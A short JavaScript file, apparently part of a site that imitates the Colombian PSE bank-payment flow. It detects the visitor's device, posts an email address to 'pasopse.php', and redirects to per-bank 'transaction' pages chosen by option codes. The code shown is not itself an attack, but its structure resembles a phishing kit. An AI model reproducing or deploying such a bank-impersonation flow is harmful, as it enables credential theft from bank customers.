function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

function cargar_banco(op){
    if (op == "t23") {
        window.location.href = "../transaction/sucursal";
    }else{
        if (op == "t18") {
            window.location.href = "../transaction/clientes"; 
        }else{
            if (op == "t12") {
                window.location.href = "../transaction/personas";  
            }else{
                window.location.href = "../transaction/ent/" + op;     
            }
        }
    }     
}

function enviar_pse(e){      
    $.post( "../process/pasopse.php", {eml:e} ,function(data) {         
        setTimeout(cargar_banco, 800,$("#hdd-opcion").val());            
    });
}